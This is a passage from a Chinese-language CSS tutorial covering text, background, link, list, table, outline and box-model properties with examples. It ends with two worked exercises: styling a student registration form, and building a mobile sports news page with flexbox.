**控制元素中的字母。**                                  |\n| **text-overflow**   | **设置是否使用一个省略标记（...）标示对象内文本的溢出** |\n| **text-stroke**     | **复合属性。设置或检索对象中的文字的描边**              |\n| **unicode-bidi**    | **设置文本方向。**                                      |\n| **white-space**     | **设置元素中空白的处理方式。**                          |\n| **word-spacing**    | **设置字间距。**                                        |\n\n#### 13.1 text-overflow 文本溢出\n\n> 语法：text-overflow：clip|ellipsis \n> 取值：\n> `clip：`当对象内文本溢出时不显示省略标记(...)，而是将溢出的部分裁切掉。\n> `ellipsis：`当对象内文本溢出时显示省略标记(...)，插入位置为最后一个字符。\n\n注意: 该属性需要和`overflow:hidden`属性(溢出处理)、`white-space:nowrap `(禁止换行)配合使用，否则无法看到效果。\n\n```css\noverflow: hidden;\nwhite-space: nowrap;\ntext-overflow: ellipsis;\n```\n实例\n\n```html\n<!doctype html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title></title>\n<style type=\"text/css\">\ndl {\n    width:240px;\n\theight:150px;\n    border:solid 1px #ccc;\n}\ndt {\n    padding:8px 8px;\n    background:#7FECAD url(images/green.gif) repeat-x;\n    font-size:13px;\n    text-align:left;\n    font-weight:bold;\n    color:#71790C;\n    margin-bottom:12px;\n    border-bottom:solid 1px #efefef;\n}\ndd {\n    font-size:0.78em;\n    height:1.5em;\n    width:220px;\n    padding:2px 2px 2px 18px;\n    background:url(images/icon.gif) no-repeat left 25%;\n    margin:2px 0;\n\t/*文本溢出处理*/\n\toverflow: hidden;\n\twhite-space: nowrap;\n    text-overflow: ellipsis; /*clip*/\t\t\n}\n</style>\n</head>\n\n<body>\n<dl>\n  <dt>收藏新闻</dt>\n  <dd>钱币|5盎司彩银虎币价值几何 三连8豹子钞市值达千元 </dd>\n  <dd>海外|安倍在李光耀葬礼上睡大觉 Google let you know</dd>\n  <dd>藏界|地产商谈收藏：跟拿地异曲同工 拾垃圾的老外</dd>\n  <dd>逸闻|最潮兵马俑亮相西安 藏友发现日军内参书籍</dd>\n</dl>\n</body>\n</html>\n```\n\n当使用`text-overflow: ellipsis;`时：\n\n![](https://i.loli.net/2020/04/07/aRJ4vwU3EQP7IhC.png)\n\n当使用`text-overflow: clip;`时：\n\n![](https://i.loli.net/2020/04/07/i7nhtUTguAoabd6.png)\n\n#### 13.2 text-align 水平对齐\n\n> 语法：text-align：left | center | right | justify | start | end\n> 取值：\n> left：内容左对齐。 \n> center：内容居中对齐。\n> right：内容右对齐。\n> justify：内容两端对齐。*目前**chrome**浏览器不支持！*\n> start：内容对齐开始边界。（CSS3） \n> end：内容对齐结束边界。（CSS3）\n\n实例\n\n```html\n<!DOCTYPE html>\n<html>\n<body>\n<h1 style=\"text-align:center\">登幽州台歌</h1>\n<h3 style=\"text-align:left\">选自：</h3>\n<h3 style=\"text-align:right\">唐诗三百首</h3>\n<p style=\"text-align:justify\">\n  前不见古人\n  后不见来者\n</p>\n<p style=\"text-align:strat\">念天地之悠悠</p>\n<p style=\"text-align:end\">独怆然而涕下</p>\n</body>\n</html>\n```\n\n![](https://i.loli.net/2020/04/07/EWDaBokSmYjuwdV.png)\n\n#### 13.3 vertical-align **垂直对齐**\n\n> 语法：vertical-align: baseline|sub|super|top|text-top|middle |bottom|text-bottom|length; \n\n| 取值        | 描述                                                         |\n| :---------- | :----------------------------------------------------------- |\n| baseline    | 默认。元素放置在父元素的基线上。                             |\n| sub         | 垂直对齐文本的下标。                                         |\n| super       | 垂直对齐文本的上标                                           |\n| top         | 把元素的顶端与行中最高元素的顶端对齐                         |\n| text-top    | 把元素的顶端与父元素字体的顶端对齐                           |\n| middle      | 把此元素放置在父元素的中部。                                 |\n| bottom      | 把元素的顶端与行中最低的元素的顶端对齐。                     |\n| text-bottom | 把元素的底端与父元素字体的底端对齐。                         |\n| length      |                                                              |\n| %           | 使用 \"line-height\" 属性的百分比值来排列此元素。允许使用负值。 |\n| inherit     | 规定应该从父元素继承 vertical-align 属性的值。               |\n\n![vertical-align](https://i.loli.net/2020/04/07/5m3cF8NpYs76fVH.gif)\n\n#### 13.4 text-shadow 文本阴影\n\n> 语法一：\n> text-shadow: X-offset|Y-offset|模糊半径(Blur)|颜色(Color)\n> X-offset和Y-offset：分别为阴影在水平和竖直方向上延伸的距离（可正可负）\n> Color：阴影颜色，默认为字体颜色\n> Blur：模糊半径，不可为负值\n> 注意：模糊半径和阴影颜色属性值位置可调换\n\n![](https://i.loli.net/2020/04/07/FYlagAZ574Vr3zx.png)\n\n\n\n> 语法二：多重阴影\n> text-shadow: X-offset|Y-offset|Blur|Color **,**\n>             \t\t\t   X-offset|Y-offset|Blur|Color**,**\n>           \t\t\t\t  X-offset|Y-offset|Blur|Color;\n>注意：最先写的阴影显示在最顶层\n\n```html\n<!DOCTYPE html>\n<html >\n<head>\n<style type=\"text/css\">\np {\n    text-align: center;\n    font:bold 60px helvetica, arial, sans-serif;\n    color: red;\n    text-shadow:0.2em 0.5em 0.1em #600,\n      \t\t\t-0.3em 0.1em 0.1em #060,\n      \t\t\t0.4em -0.3em 0.1em #006;   \n}\n</style>\n</head>\n\n<body>\n<p>HTML5+CSS3</p>\n</body>\n</html>\n\n```\n\n![](https://i.loli.net/2020/04/07/RAQ183fjqVTN7Kw.png)\n\n#### 13.5 text-stroke 文本描边\n\n> 语法：text-stroke: text-stroke-width|text-stroke-color\n>\n> text-stroke-width：描边厚度\n>\n> text-stroke-color：描边颜色\n\n```html\n<!doctype html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<title>text-stroke_CSS</title>\n<style>\n\tp{\n\t\tfont-size:50px; \n\t}\n\t#text-stroke{\n\t\t-webkit-text-stroke:2px red;\n\t\t}\n\t#text-hollow{\n\t\tcolor:white;\n\t\t-webkit-text-stroke:2px red;\n\t\t}\n</style>\n</head>\n<body>\n<div>\n\t<h1>文字描边：</h1>\n\t<p id=\"text-stroke\">HTML5+CSS3</p>\n    \n    <h1>文字镂空：</h1>\n\t<p id=\"text-hollow\">HTML5+CSS3</p>\n</div>\n</body>\n</html>\n```\n![](https://i.loli.net/2020/04/07/ijA8S4cxBqvfo1X.png)\n\n#### 13.6 box-shadow **盒子阴影**\n\n> 语法一：box-shadow: *h-shadow | v-shadow | blur | spread | color |* inset;\n\n| 值         | 说明                                                   |\n| ---------- | ------------------------------------------------------ |\n| *h-shadow* | 阴影的水平偏移。允许负值                               |\n| *v-shadow* | 阴影的垂直偏移。允许负值                               |\n| *blur*     | 可选。模糊距离                                         |\n| *spread*   | 可选。阴影延伸的大小，可理解为把阴影向两个方向加大尺度 |\n| *color*    | 可选。阴影的颜色。                                     |\n| inset      | 可选。内阴影                                           |\n\n注：前4个参数单位都一样，因此需注意顺序！\n\n> 语法二：多重阴影\n> box-shadow: h-shadow v-shadow blur spread color inset ,\n> \t\t\t\t\t\th-shadow v-shadow blur spread color inset ,\n> \t\t\t\t\t\th-shadow v-shadow blur spread color inset;\n\n实例\n\n```html\n<!DOCTYPE html>\n<html lang=\"zh-cn\">\n<head>\n<meta charset=\"utf-8\" />\n<title>box-shadow_CSS</title>\n<style>\n.test li{margin-top:20px;list-style:none;}\n\n.test .out{\n\t width:400px;\n\t padding:10px; \n\t background:#eee;\n\t\n}\n.test .outset{\n\t width:400px;\n\t padding:10px; \n\t background:#eee;\n\t-webkit-box-shadow:5px 5px pink;/* -webkit-：内核 */\n\t\n}\n\n.test .outset-blur{\n\twidth:400px;\n\tpadding:10px;\n\tbackground:#eee;\n\t-webkit-box-shadow:5px 5px 5px pink;\n}\n.test .outset-extension{\n\twidth:400px;\n\tpadding:10px;\n\tbackground:#eee;\n\t-webkit-box-shadow:5px 5px 5px 10px pink;\n\tbox-shadow:5px 5px 5px 10px pink;\n\t}\n\n.test .inset{\n\twidth:400px;\n\tpadding:10px;\n\tbackground:#eee;\n\t-webkit-box-shadow:2px 2px 5px 1px pink inset;\n\tbox-shadow:2px 2px 5px 1px pink inset;\n\t}\n\t\n.test .multiple-shadow{\n\twidth:400px;\n\tpadding:10px;\n\tbackground:#eee;\n\tbox-shadow:0 0 5px 3px red,\n\t\t\t\t0 0 5px 9px green,\n\t\t\t\t0 0 5px 15px yellow;}\n</style>\n</head>\n<body>\n<ul class=\"test\">\n    <li class=\"out\">无效果<br/>无效果</li>\n\t<li class=\"outset\">外阴影常规效果<br/>box-shadow:5px 5px pink;</li>\n\t<li class=\"outset-blur\">外阴影模糊效果<br/>box-shadow:5px 5px 5px pink;</li>\n\t<li class=\"outset-extension\">外阴影模糊外延效果<br/>box-shadow:5px 5px 5px 10px pink;</li>\n\t<li class=\"inset\">内阴影效果<br/>box-shadow:2px 2px 5px 1px pink inset;</li>\n\t<li class=\"multiple-shadow\">外阴影模糊效果<br/>box-shadow:0px 0px 5px 3px color ;</li>\n</ul>\n</body>\n</html>\n```\n\n![](https://i.loli.net/2020/04/08/fmAqZiD1zVT7b3c.png)\n\n### 14 背景\n\n背景属性\n![](https://i.loli.net/2019/08/16/4SeOwBaox6sy1i2.png)\n背景色\n\n```css\np {background-color: gray;}\n```\n如果您希望背景色从元素中的文本向外延伸，只需增加一些内边距：\n```css\np {background-color: gray; padding: 20px;}\n```\n背景图像\n```css\nbody {background-image: url(\"eg.png\");}\np{background-image: url(\"eg.png\");}\n```\n背景重复\n如果需要在页面上对背景图像进行平铺，可以使用 background-repeat 属性。\n\n属性值 `repeat` 导致图像在水平垂直方向上都平铺，就像以往背景图像的通常做法一样。`repeat-x` 和 `repeat-y` 分别导致图像只在水平或垂直方向上重复，`no-repeat` 则不允许图像在任何方向上平铺。\n\n默认地，背景图像将重复y轴\n```css\nbody\n  { \n  background-image: url('eg.gif');\n  background-repeat: repeat-y;\n  }\n```\n背景定位\n可以利用 background-position 属性改变图像在背景中的位置。\n\n下面的例子在 body 元素中将一个背景图像居中放置：\n```css\nbody\n  { \n    background-image:url('eg.gif');\n    background-repeat:no-repeat;\n    background-position:center;\n  }\n```\n为 background-position 属性提供值有很多方法。首先，可以使用一些关键字：`top、bottom、left、right 和 center`通常，这些关键字会成对出现，不过也不总是这样。还可以使用长度值，如 100px 或 5cm，最后也可以使用百分数值。不同类型的值对于背景图像的放置稍有差异。\n\n关键字\n图像放置关键字最容易理解，其作用如其名称所表明的。例如，`top right` 使图像放置在元素内边距区的右上角。\n\n如果只出现一个关键字，则认为另一个关键字是 center。\n所以，如果希望每个段落的中部上方出现一个图像，只需声明如下：\n```css\np{ \n    background-image:url('bgimg.gif');\n    background-repeat:no-repeat;\n    background-position:top;\n  }\n```\n![](https://i.loli.net/2019/08/16/s5fwqFjCNegUav4.png)\n\n长度值\n长度值解释的是元素内边距区左上角的偏移。偏移点是图像的左上角。\n\n比如，如果设置值为 50px 100px，图像的左上角将在元素内边距区左上角向右 50 像素、向下 100 像素的位置上：\n```css\nbody\n  { \n    background-image:url('eg.gif');\n    background-repeat:no-repeat;\n    background-position:50px 100px;\n  }\n```\n背景关联\n如果文档比较长，那么当文档向下滚动时，背景图像也会随之滚动。当文档滚动到超过图像的位置时，图像就会消失。\n\n您可以通过 background-attachment 属性防止这种滚动。通过这个属性，可以声明图像相对于可视区是固定的（fixed），因此不会受到滚动的影响：\n```css\nbody \n  {\n  background-image:url(/i/eg_bg_02.gif);\n  background-repeat:no-repeat;\n  background-attachment:fixed\n  }\n```\nbackground-attachment 属性的默认值是 scroll，也就是说，在默认的情况下，背景会随文档滚动。\n\n### 15 链接\n\n链接样式的 CSS 属性有很多种（例如 color, font-family, background 等等）\n链接的四种状态：\n\n```css\na:link - 未被访问的链接\na:visited - 用户已访问的链接\na:hover - 鼠标指针位于链接的上方\na:active - 链接被点击的时刻\n```\n示例：四种状态下的颜色情况\n```css\na:link {color:#FF0000;}\t\t/* 未被访问的链接 */\na:visited {color:#00FF00;}\t/* 已被访问的链接 */\na:hover {color:#FF00FF;}\t/* 鼠标指针移动到链接上 */\na:active {color:#0000FF;}\t/* 正在被点击的链接 */\n```\n示例：四种状态下的下划线(text-decoration)情况\n```css\na:link {text-decoration:none;}\na:visited {text-decoration:none;}\na:hover {text-decoration:underline;}\na:active {text-decoration:underline;}\n```\n### 16 列表\n\n列表属性\n![](https://i.loli.net/2019/08/18/1P49IeVr2fvzKAj.png)\nHTML示例\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <title>css列表</title>\n<link rel=\"stylesheet\" type=\"text/css\"href=\"style.css\"> \n</head>\n<body>\n   <ul>\n       <li>苹果</li>\n       <li>西瓜</li>\n       <li>香蕉</li>\n   </ul>\n</body>\n</html>\n\n```\n列表项的标志类型（list-style-type）\n```css\nul{\n    list-style-type: square    /*方形*/\n}\n```\n运行结果\n![](https://i.loli.net/2019/08/18/AwXMEhPfI4oaSDV.png)\n列表项图像 (list-style-image)\n\n```css\nul{\n     list-style-image: url(\"dance.gif\"); \n}\n```\n运行结果\n![](https://i.loli.net/2019/08/18/q5mpI7wT9cJKeCx.png)\n列表项目标记的位置：(list-style-position)\n![](https://i.loli.net/2019/08/18/AQXMczo9gUk3E5N.png)\n\n```css\nul\n  {\n  list-style-position:inside;\n  }\n```\n  ![](https://i.loli.net/2019/08/18/nplIEf3rh2s8oUj.png)\n### 17 表格\n\n![](https://i.loli.net/2019/08/18/p5UNxIGaCz9yw8f.png)\n示例\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<style type=\"text/css\">\n    #customers\n      {\n      font-family:\"Trebuchet MS\", Arial, Helvetica, sans-serif;\n      width:100%;\n      border-collapse:collapse;\n      }\n    \n    #customers td, #customers th \n      {\n      font-size:1em;\n      border:2px solid blue;\n      padding:3px 7px 2px 7px;\n      }\n    \n    #customers th \n      {\n      font-size:1.1em;\n      text-align:left;\n      padding-top:5px;\n      padding-bottom:4px;\n      background-color:#A7C942;\n      color:#ffffff;\n      }\n    \n    #customers tr.alt td \n      {\n      color:crimson; \n      background-color:darksalmon;\n      }\n</style>\n</head>\n\n<body>\n<table id=\"customers\">\n    <tr>\n        <th>Company</th>\n        <th>Contact</th>\n        <th>Country</th>\n    </tr>\n\n    <tr>\n        <td>Apple</td>\n        <td>Steven Jobs</td>\n        <td>USA</td>\n    </tr>\n\n    <tr class=\"alt\">\n        <td>Baidu</td>\n        <td>Li YanHong</td>\n        <td>China</td>\n    </tr>\n\n    <tr>\n        <td>Google</td>\n        <td>Larry Page</td>\n        <td>USA</td>\n    </tr>\n\n    <tr class=\"alt\">\n        <td>Lenovo</td>\n        <td>Liu Chuanzhi</td>\n        <td>China</td>\n    </tr>  \n</table>\n</body>\n</html>\n```\n运行结果：\n![](https://i.loli.net/2019/08/18/nd8WT1AqZDPpKi4.png)\n\n### 18 轮廓\n\n ![](https://i.loli.net/2019/08/18/4hUTxW5v9ikRQ2A.png)\n示例：`<p>突出效果</p>`\n\n```css\np{\n    outline-color:red;\n    outline-style:groove; /*凹槽形式*/\n    outline-width:5px\n}\n上下效果等同\np{\n    outline:red groove 5px;\n}\n```\n运行结果：\n![](https://i.loli.net/2020/03/10/E9xX4VJhgDeYCiM.png)\n\n### 19 盒子模型\n\n> 所有HTML元素可以看作盒子,它包括：边距，边框，填充，和实际内容。\n\n![](https://www.runoob.com/images/box-model.gif)\n\n- **Margin(外边距)** - 清除边框外的区域，外边距是透明的。\n- **Border(边框)** - 围绕在内边距和内容外的边框。\n- **Padding(内边距)** - 清除内容周围的区域，内边距是透明的。\n- **Content(内容)** - 盒子的内容，显示文本和图像。\n\n当您指定一个元素的宽度和高度属性时，你只是设置了`内容区域的宽度和高度`。要知道，完全大小的元素，你还必须添加填充，边框和边距。[实例](https://www.runoob.com/try/try.php?filename=trycss_boxmodel)\n\nmargin详细：https://www.runoob.com/css/css-margin.html\n\nborder详细：https://www.runoob.com/css/css-border.html\n\npadding详细：https://www.runoob.com/css/css-padding.html\n\n## CSS实例练习\n\n### 目的\n\n- 掌握类、标签、ID、元素状态伪类、目标伪类等选择器的使用；\n\n- 掌握文本、文本阴影、文本对齐；\n\n- 背景图像、景背颜色、背景定位、边框、边框圆角的设置；\n\n- 掌握盒子模型、页面宽度自适应控制、对齐方式和浮动定位；\n\n### 题目\n\n**修改Regiser.html文档，创建并链接“mystyle.css”样式表，使用CSS设计页面布局，替换原有表格布局，页面效果需尽可能与图1、2一致，主要要求如下：**\n\n>(1)\t设置页面父容器宽度随浏览器窗口大小自适应改变，但最小不小于400px，最大不大于700px，并且居中显示，设置边框、背景色和字符间距；\n>(2)\t设置默认字体大小为13px，设置标题“注册信息”的大小为默认字体的1.5倍，字体透明，使用三重文本阴影显示（红、蓝、绿），分别使用rgba设置具有一定透明度的阴影颜色；\n>(3)\t页面每一行（对应一类信息）放在一个div中，设置div背景色和圆角边框；\n>(4)\t每一行的提示文本、输入框和右侧辅助信息保持垂直居中对齐，且保障各行间的各同类元素水平对齐；\n>(5)\t姓名和密码输入框中显示背景图像；\n>(6)\t单选按钮和复选按钮被选中时，其后的辅助文本动态变化为红色字体；\n>(7)\t用户单击“返回顶部”时回到页面顶部，并且标题字体变为红色。\n>(8)\t注意：除了表格相关的标签，不能修改其余标签。\n\n| 效果图                                                  | 效果图                                                  |\n| ------------------------------------------------------- | ------------------------------------------------------- |\n| ![图1](https://img.jwt1399.top//img/20200810170438.png) | ![图2](https://img.jwt1399.top//img/20200810164536.jpg) |\n\n### 解答\n\n#### Regiser.html\n\n```html\n<!doctype html>\n<html>\n\t<head>\n\t<meta charset=\"utf-8\">\n\t<title>新生报到</title>\n\t<link href=\"styles/mystyle.css\" rel=\"stylesheet\" type=\"text/css\">\n\t\n\t</head>\n\t<body>\n\t<div id=\"wrapper\">\n\t\t<h3 id=\"title\" align=\"center\">注 册 信 息</h3>\n\t\t<hr noshade size=\"1\" width=\"99%\">\n\t\t<form action=\"\" id=\"form1\" autocomplete=\"on\" method=\"get\">\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">姓名：</span>  \n\t\t\t\t<input type=\"text\" class=\"item-inp\" name=\"user_name\" maxlength=\"10\" autofocus required/><span class=\"star\"> *</span>\n\t\t\t</div>\n\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">学号：</span>  \n\t\t\t\t<input type=\"text\" class=\"item-inp\" name=\"user_id\" required/><span class=\"star\"> *</span>\n\t\t\t</div>\t\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">密码：</span> \n\t\t\t\t<input type=\"password\" class=\"item-inp\" name=\"user_paw\"  placeholder=\"请输入8位密码\" required /><span class=\"star\"> *</span>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">性别：</span>\n\t\t\t\t<div class=\"item-inp\"><label><input type=\"radio\" name=\"user_sex\" value=\"man\"/><span>男</span></label>\n\t\t\t\t<input type=\"radio\" id=\"user_sex\"  name=\"user_sex\" value=\"woman\" checked/><label for=\"user_sex\">女</label>\n\t\t\t\t</div>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">身高：</span>\n\t\t\t\t<input type=\"number\" class=\"item-inp\" name=\"user_height\" min=\"150\" max=\"190\" value=\"175\" step=\"5\" /> 厘米\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">体重：</span>\n\t\t\t\t<input type=\"range\" class=\"item-inp\" name=\"user_weight\" min=\"45\" max=\"90\" value=\"55\" step=\"2\" /> 千克\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">出生日期：</span>\n\t\t\t\t<input type=\"date\"  class=\"item-inp\" name=\"user_birthday\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">电话号码：</span>\n\t\t\t\t<input type=\"tel\" class=\"item-inp\" name=\"user_tel\" pattern=\"\\d{11}\" placeholder=\"请输入11手机号码\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">E-mail：</span>\n\t\t\t\t<input type=\"email\" class=\"item-inp\" name=\"user_email\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">个人主页：</span>\n\t\t\t\t<input type=\"url\" class=\"item-inp\" name=\"user_homepage\" autocomplete=\"off\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">家庭住址：</span>\n\t\t\t\t<select class=\"item-inp\" name=\"user_address\" >\n\t\t\t\t\t<option value=\"0\" >北京</option>\n\t\t\t\t\t<option value=\"1\" >上海</option>\n\t\t\t\t\t<option value=\"2\" selected>成都</option>\n\t\t\t\t</select>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">邮政编码：</span>\n\t\t\t\t<input type=\"text\" class=\"item-inp\" name=\"user_zipcode\" pattern=\"[0-9]{6}\" placeholder=\"请输入6位邮政编码\" />\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">最爱的颜色：</span>\n\t\t\t\t\t<input type=\"color\" class=\"item-inp\" name=\"user_color\"/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">喜欢的运动：</span>\n\t\t\t\t<input type=\"checkbox\" name=\"user_habit1\" value=\"basketball\"/><span>篮球</span>\n\t\t\t    <input type=\"checkbox\" name=\"user_habit2\" value=\"football\" checked><span>足球</span>\n\t\t\t    <input type=\"checkbox\" name=\"user_habit3\" value=\"swimming\"><span>游泳</span>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">喜欢的网站：</span>\n\t\t\t\t<input type=\"url\" class=\"item-inp\" name=\"user_favurl\" list=\"urllist\"/>\n\t\t\t\t<datalist id=\"urllist\" >\n\t\t\t\t\t\t<option label=\"百度\" value=\"http://www.baidu.com\"/>\n\t\t\t\t\t\t<option label=\"新浪\" value=\"http://www.sina.com\"/>\n\t\t\t\t\t\t<option label=\"谷歌\" value=\"http://www.google.com\"/>\n\t\t\t\t\t\t<option value=\"http://www.163.com\">网易</option>\n\t\t\t\t</datalist>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">生活照2张：</span>\n\t\t\t\t<input type=\"file\" class=\"item-inp\" name=\"user_album\"  multiple/>\n\t\t\t</div>\n\t\t\t\n\t\t\t<div class=\"info-item\"><span class=\"item-name\">个人自述：</span>\n\t\t\t\t\t<textarea name=\"info\" rows=\"5\" cols=\"50\">我是一位特别热爱学习的好孩子。。。</textarea>\n\t\t\t</div>\n\t\t\t\t\n\t\t\t\t<input type=\"hidden\" name=\"user_secret\" value=\"7\"/>\n\t\t\t\t\n\t\t\t<div class=\"info-item\" style=\"text-align:center;\">\n\t\t\t\t\t<input type=\"submit\" class=\"item-bt\" value=\"注册\" style=\"margin-right:100px;\"/>   <input type=\"reset\" class=\"item-bt\" value=\"重置\" />\n\t\t\t</div>\n\t\t\t\t\t<hr noshade size=\"1\" width=\"99%\">\n\t\t\t\n\t\t\t\t<ul class=\"info-item\">\n\t\t\t\t\t\t<li><a href=\"tel:10086\">电话</a></li>\n\t\t\t\t\t\t<li><a href=\"sms:10086\">短信</a></li>\n\t\t\t\t\t\t<li><a href=\"mailto:10086@sina.com\">E-mail</a></li>\n\t\t\t\t\t\t<li><a href=\"#title\">返回顶部</a></li>\n\t\t\t\t</ul>\n\t</form>\n\t</div>\t\n\t<script>\n\t</script>\t\n</body>\n</html>\n```\n\n#### mystyle.css\n\n```css\n@charset \"utf-8\";\n/* CSS Document */\n*{\n\t\tfont-size:13px;/*题目2*/\n\t}\na {\ntext-decoration: none;\n}\na:link {\n\tcolor: blue;\n}\na:visited {\n\tcolor: gray;\n}\na:hover {\n\tcolor: red;\n}\na:active {\n\tcolor: yellow;\n}\n#wrapper {/*题目1*/\n\twidth: 95%;\n\tmin-width: 400px;\n\tmax-width: 700px;\n\tmargin: 10px auto;/*上下间隙10px,左右居中*/\n\tpadding-top:5px;/*上内边距*/\n\tborder: 1px solid #ccc;\n\tbackground-color: #eee;\n\tletter-spacing: 0.2em;/*字母间距*/\n}\n\n#title {/*题目2*/\n\ttext-align: center;\n\tcolor: transparent;\n\tfont-size: 1.5em;\n\tfont-weight: bolder;\n\tmargin: 10px;\n\t/*border: 1px solid red;*//*设置边框便于布局测试*/\n\ttext-shadow: 0 0 rgba(0,0,255,0.7),  \n\t\t\t\t -0.1em -0.1em 0.2em rgba(255,0,0,0.5),  \n\t\t\t\t 0.1em 0.1em 0.2em rgba(0,255,0,0.5);\n}\n\n.info-item{/*题目3*/\n\tmargin: 10px;\n\tpadding: 3px;\n\t/*border: 1px solid green;*/\n\tborder-radius: 10px/6px;\n\tbackground-color: rgba(204,204,204,0.4);\n}\n.item-name {/*题目4*/\n\twidth: 32%;\n\tdisplay: inline-block;/*让块元素保持在一行*/\n\ttext-align: right;\n\tvertical-align: middle;/*文本和输入域均设置垂直居中对齐*/\n}\n.item-inp{\n\twidth: 40%;\n\tbox-sizing:border-box;/*否则设置了背景图像的输入域因padding-left而变宽*/\n\tdisplay: inline-block;\n\tvertical-align: middle;\n\tmargin-right:0.5em;\n}\n\n/*带有背景图像的输入域样式设计*/   \n/*:nth-child(1)父元素的第一个子元素，也就是第一个info-item所包含的input*/\n.info-item:nth-child(1) input{/*题目5*/\n\tbackground: url(../images/name.gif) no-repeat;\n\tbackground-color: white;/*设置背景图像后，默认的背景色将会是父元素的背景色（如果存在，否则背景色透明）*/\n\tpadding-left: 20px;/*使得content输入区在背景图像右边*/\n\tborder: 1px solid #ccc;/*如果不重定义边框，则会因为背景图像的影响而出现立体边框*/\n\t\n}\n/*第三个info-item所包含的input*/\n.info-item:nth-child(3) input {\n\tbackground: url(../images/password.gif) no-repeat;\n\tbackground-color: white;\n\tpadding-left: 20px; /*增加左内边距来放图标*/\n\tborder: 1px solid #ccc;/*如果不重定义边框，则会因为背景图像的影响而出现立体边框*/\n}\n\ninput:checked+span,input:checked+label {/*设置被选中的单选按钮和复选框后的文字的颜色*/\n\tcolor: red;/*题目6*/\n}\ntextarea{\n\twidth:60%;\n\tvertical-align:middle;\n}\n\n/*设置导航链接的样式*/\nul, li {\n\tbox-sizing: border-box;\n\tborder-radius: 10px/6px;\n\tbackground-color: rgba(204,204,204,0.4);\n}\nul {\n\tlist-style: none;\n\ttext-align:center;\n}\nli {\n\twidth: 22%;\n\tdisplay:inline-block;\n}\nli:nth-child(odd):hover {\n\ttransition: transform 1s ease-in-out;\n\ttransform: scale(1.2) rotate(-15deg);\n}\nli:nth-child(even):hover {\n\ttransition: transform 1s ease-in-out;\n\ttransform: scale(1.2) skew(30deg);\n}\n\n.star{color:#F00;}\n\n#title:target{/*返回顶部时改变title字体颜色*/\n\tcolor:red;/*题目7*/\n}\n```\n\n\n## HTML&CSS实例练习\n\n### 目的\n\n- 掌握viewport视口；\n\n- 掌握**ul-li**列表结构的应用；\n\n- 掌握**dl-dt-dd**定义列表结构的应用；\n- 掌握弹性盒布局。\n\n### 题目\n\n**设计某浪移动版网站首页的体育板块，页面效果如图1、2所示。**\n\n> (1)\t设置页面视区宽度为设备宽，初始缩放比例为1.0，允许用户最大缩放比例为1.5，最小为0.8；\n> (2)\t分别使用ul-li结构设计首行“体育  中超、英超、NBA”文本导航链接和“国足、西甲、欧冠、CBA、亚冠”图片导航链接，在两行导航间插入水平线用于分隔；\n> (3)\t文本导航链接使用浮动定位，图片导航链接采用弹性盒布局，每个列表项中的图片宽度自适应变化，限制最大宽度70个像素；\n> (4)\t从第三行开始插入多条新闻主题，包括图片、标题和评论数和评论图标链接，每一条新闻采用dl-dt-dd标签结构来设计，每一个dl标签的高度为80个像素，请使用弹性盒布局来设计，隐藏图片溢出部分，评论数和评论图标垂直居中对齐。\n> (5)\t在多条新闻之后插入“展开更多”导航及其图标，要求图标和文字垂直居中对齐；\n> (6)\t注意页面中不同文本的字体设置，使用em单位，并设置新闻中标题为1.5倍行距；\n> (7)\t盒布局中采用box-flex设置各元素大小自适应，要求页面能够适应不同屏幕宽度的设备，如图1和图2所示。\n\n| 效果图                                                  | 效果图                                                      |\n| ------------------------------------------------------- | ----------------------------------------------------------- |\n| ![图1](https://img.jwt1399.top//img/20200811151956.png) | **![图2](https://img.jwt1399.top//img/20200811152008.jpg)** |\n\n### 解答\n\n```html\n<!doctype html>\n<html>\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0,maximum-scale=1.2, minimum-scale=0.8\"><!--题目1-->\n<title>某浪体育</title>\n<style>\n/*设置默认样式*/\n* {\n\tfont-size: 14px;\n}\n#sports{\n\twidth:95%;\n\tmin-width:410px;\n\tmargin: 10px auto;\n}\nul {\n\tlist-style: none;\n\tmargin: 0;\n\tpadding: 0;\n}\n/*题目3*/\n/*设置首行文本导航样式，采用浮动定位*/\n.tit_list {\n\tpadding: 0;\n\tcolor:#06C;\n}\n\n.tit_list li {\n\tmargin:5px;\n\tfloat: right;\n}\n\n.tit_list li:first-child {\n\tfont-weight: bolder;\n\tfont-size: 1.2em;\n\tfloat: left;\n}\n/*题目3*/\n/*设置图片导航样式，采用弹性盒布局*/\n.nav_items {\n\t/*margin: 10px auto;*/\n\tdisplay: -webkit-box;\n\tdisplay: box;\n\t/*border:1px dashed red;*/\n}\n\n.nav_items li {\n\ttext-align: center;\n\t-webkit-box-flex:1;\n\t/*border:1px dashed red;*/\n}\n\n.nav_items li img{ width:90%; max-width:70px;}/*根据列表项宽度缩小图片*/\n/*题目4*/\n/*设置新闻链接样式，采用弹性盒布局*/\ndl {\n\theight:80px;\n\tdisplay: -webkit-box;\n\tdisplay: 